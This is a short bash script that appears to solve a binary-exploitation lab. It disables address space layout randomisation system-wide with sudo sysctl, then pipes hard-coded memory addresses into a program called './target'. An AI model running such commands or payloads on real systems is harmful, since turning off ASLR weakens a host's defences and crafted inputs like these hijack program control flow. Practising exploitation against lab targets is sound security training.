#!/bin/bash
sudo sysctl -w kernel.randomize_va_space=0
(echo 6020a8; echo 400d88; echo 40091d; echo 0x00007fffffffd554; echo 0x7fffffffe711; echo 100; echo 0x7fffffffe732) | ./target
